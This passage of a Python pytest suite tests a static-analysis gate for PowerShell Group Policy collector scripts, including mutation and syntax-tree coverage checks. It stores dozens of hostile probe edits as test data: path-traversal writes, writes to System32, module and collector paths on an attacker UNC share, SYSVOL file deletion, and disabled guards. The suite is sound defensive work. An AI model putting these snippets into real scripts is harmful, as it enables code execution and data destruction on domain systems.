        "$sub = '..\\..\\x'\nSet-Content -LiteralPath \"$OutputRoot\\$sub\" -Value 'owned'\n",
    ),
    (
        "ds_writealltext_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n[IO.File]::WriteAllText((Join-Path $OutputRoot $sub), 'owned')\n",
    ),
    (
        "ds_copyitem_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "Copy-Item -LiteralPath $testFile -Destination (Join-Path $OutputRoot $sub) -Force\n",
    ),
    (
        "ds_getgporeport_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "Get-GPOReport -All -ReportType Xml -Path (Join-Path $OutputRoot $sub)\n",
    ),
    (
        "ds_function_wrapped_write",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "function Invoke-GateWrite { Set-Content -LiteralPath (Join-Path $OutputRoot $sub) "
        "-Value 'owned' }\nInvoke-GateWrite\n",
    ),
    # NEW-BL-2: scope-qualified and foreach rebinds of pinned roots / exec sink.
    (
        "ds_script_scope_outputroot",
        "Export-GpoEstate.ps1",
        "append",
        "$script:OutputRoot = 'C:\\Windows\\System32'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot 'evil.dll') -Value 'owned'\n",
    ),
    (
        "ds_foreach_abs_root",
        "Export-GpoEstate.ps1",
        "append",
        "$evil = 'C:\\Windows\\System32'\n"
        "foreach ($OutputRoot in $evil) { Set-Content -LiteralPath "
        "(Join-Path $OutputRoot 'evil.dll') -Value 'owned' }\n",
    ),
    (
        "ds_script_collectorpath",
        "Run-GpoLensCollection.ps1",
        "append",
        "$script:CollectorPath = '\\\\attacker.example.test\\share\\Mutate-Domain.ps1'\n",
    ),
    (
        "ds_script_windowsroot",
        "Register-GpoLensCollection.ps1",
        "append",
        "$script:windowsRoot = 'C:\\attacker'\n",
    ),
    (
        "ds_script_logpath",
        "Run-GpoLensCollection.ps1",
        "append",
        "$script:LogPath = 'C:\\Windows\\System32\\evil.log'\n",
    ),
    # --- Round-3 candidates (Sol / DeepSeek), each previously accepted ---
    # Sol BL-2: receiver rebind onto an allowlisted side-effecting method.
    (
        "r3_receiver_rebind_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "$entry = Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml'\n"
        "$entry.Delete()\n",
    ),
    # Sol BL-2: the exact allowed vector, duplicated outside ShouldProcess.
    (
        "r3_unregister_duplicate",
        "Register-GpoLensCollection.ps1",
        "append",
        "Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false\n",
    ),
    # Sol BL-2: alias-provider assignment re-points a later Get-Item.
    (
        "r3_alias_provider",
        "Run-GpoLensCollection.ps1",
        "before",
        ("if ($MyInvocation.InvocationName -ne '.')", "${Alias:Get-Item} = 'Remove-Item'\n"),
    ),
    # Sol BL-1: #Requires auto-imports a module (not an AST node the old
    # inventory recorded).
    (
        "r3_requires_module",
        "Export-GpoEstate.ps1",
        "prepend",
        "#Requires -Modules GpoLensReviewerPayload\n",
    ),
    # Sol BL-1: weaken the reparse-point guard (-or -> -and).
    (
        "r3_guard_or_to_and",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint))",
            "if (-not $root.PSIsContainer -and ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint))",
        ),
    ),
    # Sol BL-1: move the guard after the delete/create it protects.
    (
        "r3_reorder_guard_after_open",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "    if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint)) {\n"
            "        throw 'Registration refuses a linked output root.'\n"
            "    }\n"
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n"
            "    # File.Delete unlinks this directory entry; it never writes through a link.\n"
            "    # CreateNew refuses an object substituted between deletion and creation.\n"
            "    [IO.File]::Delete($marker)\n"
            "    $stream = [IO.File]::Open($marker, [IO.FileMode]::CreateNew, "
            "[IO.FileAccess]::Write, [IO.FileShare]::None)\n",
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n"
            "    [IO.File]::Delete($marker)\n"
            "    $stream = [IO.File]::Open($marker, [IO.FileMode]::CreateNew, "
            "[IO.FileAccess]::Write, [IO.FileShare]::None)\n"
            "    if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint)) {\n"
            "        throw 'Registration refuses a linked output root.'\n"
            "    }\n",
        ),
    ),
    # DeepSeek NEW-BL-1: $PSDefaultParameterValues injects -CimSession into the
    # pinned Register-ScheduledTask call (and parameters anywhere else).
    (
        "r3_psdefault_register_cimsession",
        "Register-GpoLensCollection.ps1",
        "before",
        (
            "function ConvertTo-GpoLensTaskArgument",
            "$PSDefaultParameterValues['Register-ScheduledTask:CimSession'] = "
            "'server.example.test'\n",
        ),
    ),
    (
        "r3_psdefault_export",
        "Export-GpoEstate.ps1",
        "append",
        "$PSDefaultParameterValues['Get-GPOReport:Path'] = "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\overwritten.xml'\n",
    ),
    (
        "r3_psdefault_run",
        "Run-GpoLensCollection.ps1",
        "append",
        "$PSDefaultParameterValues['Remove-Item:Recurse'] = $true\n",
    ),
    # DeepSeek NEW-BL-2: retention guard moved after the recursive delete.
    (
        "r3_reorder_retention_guard",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "            Assert-GpoLensRegularTree -Root $folder\n"
            "            Remove-Item -LiteralPath $archive.FullName -Force\n"
            "            Remove-Item -LiteralPath $folder -Recurse -Force\n",
            "            Remove-Item -LiteralPath $archive.FullName -Force\n"
            "            Remove-Item -LiteralPath $folder -Recurse -Force\n"
            "            Assert-GpoLensRegularTree -Root $folder\n",
        ),
    ),
    # DeepSeek NEW-BL-3 / NON-BL-2: computed common-parameter variable names.
    (
        "r3_outvariable_computed",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable ('Output' + 'Root') | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r3_outvariable_indirect_var",
        "Export-GpoEstate.ps1",
        "append",
        "$n = 'OutputRoot'\n"
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable $n | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r3_errorvariable_computed",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\gate-missing' -ErrorVariable ('Log' + 'Path') "
        "-ErrorAction SilentlyContinue | Out-Null\n",
    ),
    (
        "r3_outvariable_braced",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable ${OutputRoot} | Out-Null\n",
    ),
    # DeepSeek NON-BL-1 / NON-BL-5: a member call's later argument changed.
    (
        "r3_member_later_argument",
        "Export-GpoEstate.ps1",
        "replace",
        (
            '[System.IO.File]::WriteAllText($testFile, "test")',
            '[System.IO.File]::WriteAllText($testFile, "owned")',
        ),
    ),
    (
        "r3_marker_open_mode",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::Read, "
            "[IO.FileShare]::Read)",
            "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite, "
            "[IO.FileShare]::Read)",
        ),
    ),
    # --- Same classes, found while fixing round 3 (also accepted at d1d4bef) ---
    # A root read by a pinned binding was itself unpinned.
    (
        "r4_marker_root_rebind",
        "GpoLensCollectionMarker.ps1",
        "append",
        "$root = Get-Item -LiteralPath '\\\\dc.example.test\\SYSVOL\\example.test\\Policies'\n",
    ),
    # A local function's root parameter bound at a new call site.
    (
        "r4_callsite_marker_root",
        "Register-GpoLensCollection.ps1",
        "append",
        "Write-GpoLensOwnerMarkerBytes -OutputRoot "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies' -Bytes ([byte[]](65))\n",
    ),
    (
        "r4_callsite_log_path",
        "Run-GpoLensCollection.ps1",
        "append",
        "Write-GpoLensCollectionLog -LogPath 'C:\\Windows\\System32\\evil.log' -Message 'x' "
        "-LogMaxBytes 1024 -LogFiles 1\n",
    ),
    # Multiple assignment and a filesystem-drive variable write.
    (
        "r4_multi_assignment_root",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot, $gateCount = 'C:\\Windows\\System32', 1\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r4_drive_variable_write",
        "Export-GpoEstate.ps1",
        "append",
        "${C:\\Windows\\Temp\\gate.txt} = 'owned'\n",
    ),
    (
        "r4_env_psmodulepath",
        "Export-GpoEstate.ps1",
        "append",
        "$env:PSModulePath = '\\\\attacker.example.test\\share'\n",
    ),
    # ForEach-Object invoking a method by name.
    (
        "r4_foreach_object_member",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml' "
        "| ForEach-Object Delete\n",
    ),
    # A guard function redefined as a no-op before the entry point runs.
    (
        "r4_guard_function_redefined",
        "Run-GpoLensCollection.ps1",
        "before",
        ("if ($MyInvocation.InvocationName -ne '.')", "function Assert-GpoLensRegularTree { }\n"),
    ),
    # Child data in a pinned write-target expression rebound.
    (
        "r4_safe_name_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$safe = '..\\..\\..\\Windows\\System32\\evil'\n",
    ),
    # [ref] hands a pinned root to a writer.
    (
        "r4_ref_rebind_root",
        "Run-GpoLensCollection.ps1",
        "append",
        "[guid]::TryParse('x', [ref]$OutputRoot) | Out-Null\n",
    ),
]

# NON-BL-3: the regression suite asserts WHICH substantive check flagged each
# probe, not merely that one did (so a parse error can never masquerade as a
# catch). Maps probe id -> the check name expected to raise.
_PROBE_EXPECTED_CHECK: dict[str, str] = {
    "sol_root_rebind": "pinned_bindings",
    "sol_registry_rebind": "pinned_bindings",
    "sol_set_itemtype": "writes",
    "sol_redirection": "redirections",
    "sol_redirection_stream": "redirections",
    "sol_get_gporeport_path": "writes",
    "sol_instance_delete": "dotnet",
    "sol_adsi_delete": "types",
    "sol_using_module": "usings",
    "sol_collector_rebind": "pinned_bindings",
    "sol_task_abuse": "task_action",
    "ds_writeroot_var": "pinned_bindings",
    "ds_writeroot_run": "pinned_bindings",
    "ds_adsi_copyto_marker": "types",
    "ds_register_args": "task_action",
    "ds_using_assembly": "usings",
    "neg_set_adobject": "commands",
    "neg_adsi_commit": "types",
    "neg_dynamic_member": "dotnet",
    "neg_com": "new_object_and_add_type",
    "neg_namespace_de": "usings",
    "neg_splat_write": "writes",
    "neg_addtype_inline": "new_object_and_add_type",
    "neg_import_module_unc": "commands",
    "r2_outvariable_rebind_root": "pinned_bindings",
    "r2_pipelinevariable_rebind_root": "pinned_bindings",
    "r2_errorvariable_rebind_root": "pinned_bindings",
    "r2_warningvariable_rebind_root": "pinned_bindings",
    "r2_informationvariable_rebind_root": "pinned_bindings",
    "r2_collectorpath_outvariable_override": "pinned_bindings",
    "r2_taskargs_outvariable_override": "pinned_bindings",
    "r2_parenthesized_receiver_delete": "instance_receivers",
    "r2_parenthesized_receiver_open_write": "instance_receivers",
    "r2_parenthesized_fileinfo_copyto_sysvol": "instance_receivers",
    "r2_wmi_remote_instance_delete": "types",
    "r2_taskname_direct_rebind": "pinned_bindings",
    "r2_task_unregister_wildcard": "task_action",
    "r2_task_register_remote_cimsession": "task_action",
    "r2_task_principal_runlevel_highest": "task_action",
    "r2_env_via_second_variable": "writes",
    "r2_dotdot_via_second_variable": "writes",
    "r2_computed_dotdot_via_second_variable": "writes",
    "r2_new_item_name_traversal": "writes",
    "ds_dotdot_child_var": "writes",
    "ds_interp_child": "writes",
    "ds_writealltext_child": "writes",
    "ds_copyitem_child": "writes",
    "ds_getgporeport_child": "writes",
    "ds_function_wrapped_write": "writes",
    "ds_script_scope_outputroot": "pinned_bindings",
    "ds_foreach_abs_root": "pinned_bindings",
    "ds_script_collectorpath": "pinned_bindings",
    "ds_script_windowsroot": "pinned_bindings",
    "ds_script_logpath": "pinned_bindings",
    "r3_receiver_rebind_delete": "pinned_bindings",
    "r3_unregister_duplicate": "guarded_ops",
    "r3_alias_provider": "bindings",
    "r3_requires_module": "ast",
    "r3_guard_or_to_and": "guarded_ops",
    "r3_reorder_guard_after_open": "guarded_ops",
    "r3_psdefault_register_cimsession": "bindings",
    "r3_psdefault_export": "bindings",
    "r3_psdefault_run": "bindings",
    "r3_reorder_retention_guard": "guarded_ops",
    "r3_outvariable_computed": "bindings",
    "r3_outvariable_indirect_var": "bindings",
    "r3_errorvariable_computed": "bindings",
    "r3_outvariable_braced": "bindings",
    "r3_member_later_argument": "guarded_ops",
    "r3_marker_open_mode": "guarded_ops",
    "r4_marker_root_rebind": "pinned_bindings",
    "r4_callsite_marker_root": "pinned_bindings",
    "r4_callsite_log_path": "pinned_bindings",
    "r4_multi_assignment_root": "bindings",
    "r4_drive_variable_write": "bindings",
    "r4_env_psmodulepath": "bindings",
    "r4_foreach_object_member": "commands",
    "r4_guard_function_redefined": "local_functions",
    "r4_safe_name_rebind": "pinned_bindings",
    "r4_ref_rebind_root": "pinned_bindings",
}


def _apply_edit(text: str, mode: str, edit: str | tuple[str, str]) -> str:
    if mode == "append":
        assert isinstance(edit, str)
        return text + "\n" + edit
    if mode == "prepend":
        assert isinstance(edit, str)
        return edit + text
    assert isinstance(edit, tuple)
    anchor, change = edit
    assert text.count(anchor) == 1, f"edit anchor must occur exactly once: {anchor!r}"
    if mode == "before":
        return text.replace(anchor, change + anchor, 1)
    assert mode == "replace", mode
    return text.replace(anchor, change, 1)


def _modified_inventory(
    exe: str,
    base: str,
    position: str,
    snippet: str | tuple[str, str],
    dest: Path,
    extra_files: dict[str, str] | None = None,
) -> dict[str, dict[str, Any]]:
    copy = dest / "scripts"
    copy.mkdir(parents=True, exist_ok=True)
    for name in POLICIES:
        text = (_SCRIPTS / name).read_text(encoding="utf-8")
        if name == base:
            text = _apply_edit(text, position, snippet)
        (copy / name).write_text(text, encoding="utf-8")
    for extra_name, extra_text in (extra_files or {}).items():
        (copy / extra_name).write_text(extra_text, encoding="utf-8")
    return _run_dumper(exe, [str(copy / name) for name in sorted(POLICIES)])


def test_every_probe_has_an_expected_check() -> None:
    ids = {p[0] for p in _REGRESSIONS}
    assert ids == set(_PROBE_EXPECTED_CHECK), (
        "every probe needs an expected check: "
        f"missing {sorted(ids - set(_PROBE_EXPECTED_CHECK))}, "
        f"stale {sorted(set(_PROBE_EXPECTED_CHECK) - ids)}"
    )


@pytest.mark.parametrize("probe", _REGRESSIONS, ids=[p[0] for p in _REGRESSIONS])
def test_reviewer_probes_are_flagged(tmp_path: Path, probe: Probe) -> None:
    probe_id, base, position, snippet = probe
    exe = _pwsh()
    extra = {"GateEvil.psm1": "'x' > './canary.txt'\n"} if "using_module" in probe_id else None
    inv = _modified_inventory(exe, base, position, snippet, tmp_path, extra)
    failed = _run_checks(base, inv)
    expected = _PROBE_EXPECTED_CHECK[probe_id]
    # The probe must be caught by its intended substantive check, not by a parse
    # error (NON-BL-3). The `using` probes deliberately fail parsing too, so
    # `parse` is tolerated only there.
    if "using" not in probe_id:
        assert "parse" not in failed, f"{probe_id}: flagged only by a parse error: {failed}"
    assert expected in failed, (
        f"{probe_id}: expected check {expected!r} did not flag it; raised {sorted(failed)}"
    )
    # Both layers: the edit also changes the committed syntax-tree inventory.
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    assert _canonical(inv[base])["ast"] != committed[base]["ast"], (
        f"{probe_id}: the golden syntax-tree inventory did not change"
    )


# Edits the semantic layer deliberately admits (no write/exec/binding effect)
# but the golden inventory must still catch, so a reviewer sees them.
_GOLDEN_ONLY: list[Probe] = [
    # Sol round-3 collision_return: a trailing `return` (old inventory: SAME).
    ("r3_trailing_return", "Export-GpoEstate.ps1", "append", "return\n"),
    # A changed log/progress message (content, not a write target).
    (
        "r4_message_text",
        "Export-GpoEstate.ps1",
        "replace",
        ('Write-Host "DryRun: would export the following:"', 'Write-Host "DryRun: would export:"'),
    ),
    # Comment-only edit: AST identical, source digest differs.
    ("r4_comment_only", "Run-GpoLensCollection.ps1", "append", "# reviewer note\n"),
]


@pytest.mark.parametrize("probe", _GOLDEN_ONLY, ids=[p[0] for p in _GOLDEN_ONLY])
def test_golden_catches_semantically_neutral_edits(tmp_path: Path, probe: Probe) -> None:
    probe_id, base, position, snippet = probe
    inv = _modified_inventory(_pwsh(), base, position, snippet, tmp_path)
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    assert _canonical(inv[base]) != committed[base], f"{probe_id}: golden did not change"
    if probe_id == "r4_comment_only":
        assert _canonical(inv[base])["ast"] == committed[base]["ast"]
    else:
        assert _canonical(inv[base])["ast"] != committed[base]["ast"]


# ---------------------------------------------------------------------------
# Completeness of the syntax-tree serialization (meta-tests).
# ---------------------------------------------------------------------------

# Properties the serializer deliberately skips on every node type, and why.
_EXCLUDED_AST_PROPERTIES = {
    "*.Parent": "back-reference; structure is the row nesting",
    "*.Extent": "source position/text; the text is represented by the child nodes",
    "*.ErrorPosition": "source position of an operator token",
    "*.StaticType": "derived by the parser from the node type, constant or cast",
    "ConvertExpressionAst.Attribute": "the same object as ConvertExpressionAst.Type",
}
_KNOWN_REQUIREMENT_PROPERTIES = {
    "IsElevationRequired",
    "RequiredApplicationId",
    "RequiredAssemblies",
    "RequiredModules",
    "RequiredPSEditions",
    "RequiredPSVersion",
    "RequiresPSSnapIns",  # Windows PowerShell 5.1 only
}


def test_serializer_covers_every_ast_node_type() -> None:
    """Every concrete Ast type of the running PowerShell is in the serializer
    table, and every one of its public properties is serialized or excluded
    with a stated reason. A new PowerShell node type or property fails here.
    (A listed property this runtime lacks, e.g. ScriptBlockAst.CleanBlock before
    7.3, is skipped by the serializer, so it is not an error.)"""
    described = _run_dumper_raw(_pwsh(), [], "-Describe")
    table = described["table"]
    assert set(described["excluded"]) == set(_EXCLUDED_AST_PROPERTIES)
    problems: list[str] = []
    for node in described["ast_types"]:
        name = node["name"]
        if name not in table:
            problems.append(f"{name}: not in the serializer table")
            continue
        listed = set(table[name])
        for prop in node["properties"]:
            if prop in listed or f"*.{prop}" in _EXCLUDED_AST_PROPERTIES:
                continue
            if f"{name}.{prop}" in _EXCLUDED_AST_PROPERTIES:
                continue
            problems.append(f"{name}.{prop}: neither serialized nor excluded")
    assert not problems, "serializer table is incomplete:\n" + "\n".join(problems)
    unknown = set(described["script_requirements_properties"]) - _KNOWN_REQUIREMENT_PROPERTIES
    assert not unknown, f"new #Requires properties: {sorted(unknown)}"


# One construct per node type the collectors do not use, so the serializer is
# exercised on all of them (and the semantic layer's closed node set refuses
# them). Parsed only.
_EXOTIC_SOURCE = """#Requires -Version 5.1
using namespace System.Text
class GateBox : System.Object {
    [string] $Name = 'x'
    hidden static [int] $Count
    GateBox() { $this.Name = 'y' }
    [string] Show([int] $n) { return $this.Name * $n }
}
enum GateColor { Red = 1; Blue }
function Get-Gate { [CmdletBinding()] param([Parameter(Mandatory)][ValidateNotNull()] $a)
    dynamicparam { }
    begin { trap { continue } }
    process { do { $a-- } until ($a -lt 0); do { break } while ($false) }
    end { data GateData { 'x' }; $b = $a ? 1 : 2; Get-Item . && Get-Item .. || Get-Item / }
}
filter Test-Gate { $_ }
$x = [GateBox]::new(); $x.Show(2) | Out-Null
$s = { param($q) $using:q }
Start-Sleep 1 &
foreach -parallel ($i in 1..2) { $i }
switch -regex ('a') { 'a' { 1 } default { 2 } }
$h = @{ k = 1 }; $h['k'] += 2; [int]$h.k
"text $($h.k)" | Out-Null; @'
here
'@ | Out-Null
"""


def test_serializer_handles_every_node_type(tmp_path: Path) -> None:
    source = tmp_path / "exotic.ps1"
    source.write_bytes(_EXOTIC_SOURCE.encode("ascii"))
    entry = _run_dumper_raw(_pwsh(), [str(source)])[0]
    assert entry["unsupported_nodes"] == [], entry["unsupported_nodes"]
    lines = _canonical(entry)["ast"]
    assert lines[0].startswith("Script: ScriptBlockAst ScriptRequirements=")
    used = set(entry["node_types"])
    for kind in (
        "TypeDefinitionAst",
        "PropertyMemberAst",
        "FunctionMemberAst",
        "TrapStatementAst",
        "DataStatementAst",
        "TernaryExpressionAst",
        "PipelineChainAst",
        "UsingExpressionAst",
        "DoUntilStatementAst",
        "DoWhileStatementAst",
        "UsingStatementAst",
        "BaseCtorInvokeMemberExpressionAst",
    ):
        if kind == "BaseCtorInvokeMemberExpressionAst":
            continue  # only produced for `: base(...)`; covered by the table test
        assert kind in used, f"exotic source did not produce {kind}"
    # Every one of them is outside the closed node set.
    assert used - ALLOWED_NODE_TYPES


# Single-token mutations by token kind / operator text.
_OPERATOR_SWAPS = {
    "-eq": "-ne",
    "-ne": "-eq",
    "-or": "-and",
    "-and": "-or",
    "-band": "-bor",
    "-bor": "-band",
    "-gt": "-ge",
    "-ge": "-gt",
    "-lt": "-le",
    "-le": "-lt",
    "-match": "-notmatch",
    "-notmatch": "-match",
    "-like": "-notlike",
    "-notlike": "-like",
    "-contains": "-notcontains",
    "-notcontains": "-contains",
    "-in": "-notin",
    "-notin": "-in",
    "-is": "-isnot",
    "-isnot": "-is",
    "-not": "-bnot",
    "-replace": "-creplace",
    "-split": "-csplit",
    "-join": "-split",
    "-f": "-join",
    "+": "-",
    "-": "+",
    "*": "/",
    "/": "*",
    "=": "+=",
    "+=": "=",
    "++": "--",
    "--": "++",
    "2>": "3>",
    "*>&1": "*>&2",
    "break": "continue",
    "continue": "break",
}


def _token_mutation(token: dict[str, Any]) -> str | None:
    kind, text = token["kind"], token["text"]
    if kind in ("Variable", "SplattedVariable"):
        return text[:-1] + "Q}" if text.endswith("}") else text + "Q"
    if kind == "Parameter":
        return text[:-1] + "Q:" if text.endswith(":") else text + "Q"
    if kind == "Number":
        return "8" if text == "7" else "7"
    if kind in ("StringLiteral", "StringExpandable"):
        return text[0] + "Q" + text[1:]
    if kind in ("HereStringLiteral", "HereStringExpandable"):
        cut = text.index("\n") + 1
        return text[:cut] + "Q" + text[cut:]
    if kind in ("Identifier", "Generic"):
        return text + "Q"
    return _OPERATOR_SWAPS.get(text.casefold())


def _evenly(items: list[Any], count: int) -> list[Any]:
    if len(items) <= count:
        return list(items)
    step = (len(items) - 1) / (count - 1)
    return [items[round(i * step)] for i in range(count)]


def _mutants(source: str, sites: dict[str, Any]) -> list[tuple[str, str]]:
    """(label, mutated source) pairs that must each change the syntax tree."""
    out: list[tuple[str, str]] = []
    tokens = [t for t in sites["tokens"] if _token_mutation(t) is not None]
    for t in _evenly(tokens, 40):
        new = _token_mutation(t)
        assert new is not None
        out.append(
            (
                f"token {t['kind']} {t['text']!r}@{t['start']}",
                source[: t["start"]] + new + source[t["end"] :],
            )
        )
    swaps = []
    for s1, e1, s2, e2 in sites["siblings"]:
        if _norm(source[s1:e1]) != _norm(source[s2:e2]):
            swaps.append((s1, e1, s2, e2))
    for s1, e1, s2, e2 in _evenly(swaps, 15):
        swapped = source[:s1] + source[s2:e2] + source[e1:s2] + source[s1:e1] + source[e2:]
        out.append((f"swap statements @{s1}/{s2}", swapped))
    for start, end in _evenly(list(sites["conditions"]), 12):
        out.append(
            (
                f"negate condition @{start}",
                source[:start] + "-not (" + source[start:end] + ")" + source[end:],
            )
        )
    inserts = [*_evenly(list(sites["block_starts"]), 3), len(source)]
    for pos in inserts:
        for label, stmt in (
            ("index assignment", "$PSDefaultParameterValues['Get-Item:Force'] = $true\n"),
            ("return", "return\n"),
        ):
            sep = "" if pos == 0 or source[pos - 1] in "\n " else "\n"
            out.append((f"insert {label} @{pos}", source[:pos] + sep + stmt + source[pos:]))
    out.append(("#Requires module", "#Requires -Modules GpoLensProbe\n" + source))
    out.append(("#Requires elevation", "#Requires -RunAsAdministrator\n" + source))
    return out


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_inventory_detects_systematic_mutations(tmp_path: Path, script: str) -> None:
    """Generic completeness evidence: for each collector, mutate the source in
    systematic ways — change single tokens (evenly sampled over every mutable
    token: variables, parameters, numbers, strings, here-strings, identifiers,
    command names, operators, redirections, keywords), swap adjacent
    statements, negate conditions, insert an index assignment / `return`, add
    `#Requires` — and require the serialized syntax tree to differ for every
    mutant that still parses. Comment/whitespace-only edits must leave the tree
    unchanged but change the source digest; CRLF line endings must change
    nothing at all (checkout-independence)."""
    exe = _pwsh()
    path = _SCRIPTS / script
    source = path.read_bytes().decode("ascii")
    sites = _run_dumper_raw(exe, [str(path)], "-Sites")[0]
    original = _canonical(_run_dumper_raw(exe, [str(path)], "-AstOnly")[0])
    mutants = _mutants(source, sites)
    files: list[Path] = []
    for i, (_label, text) in enumerate(mutants):
        target = tmp_path / f"m{i:04d}.ps1"
        target.write_bytes(text.encode("ascii"))
        files.append(target)
    neutral = {
        "comment": "# reviewer comment\n" + source,
        "whitespace": "\n\n" + source.replace("\n", "  \n", 1),
        "crlf": source.replace("\n", "\r\n"),
    }
    for name, text in neutral.items():
        target = tmp_path / f"neutral-{name}.ps1"
        target.write_bytes(text.encode("ascii"))
        files.append(target)
    results = _run_dumper_raw(exe, [str(f) for f in files], "-AstOnly", timeout=900)
    by_path = {Path(r["path"]).name: _canonical(r) for r in results}
    undetected: list[str] = []
    clean = 0
    for i, (label, _text) in enumerate(mutants):
        mutant = by_path[f"m{i:04d}.ps1"]
        if mutant["parse_errors"]:
            continue
        clean += 1
        if mutant["ast"] == original["ast"]:
            undetected.append(label)
    assert not undetected, f"{script}: mutations not reflected in the syntax tree: {undetected}"
    assert clean >= len(mutants) * 0.6, f"{script}: only {clean}/{len(mutants)} mutants parsed"
    for name in ("comment", "whitespace"):
        changed = by_path[f"neutral-{name}.ps1"]
        assert changed["ast"] == original["ast"], f"{script}: {name}-only edit changed the tree"
        assert changed["source_sha256"] != original["source_sha256"], name
    assert by_path["neutral-crlf.ps1"] == original, f"{script}: CRLF changed the inventory"


def test_clean_scripts_pass_all_checks(inventory: dict[str, dict[str, Any]]) -> None:
    for script in POLICIES:
        run_all_checks(script, inventory)
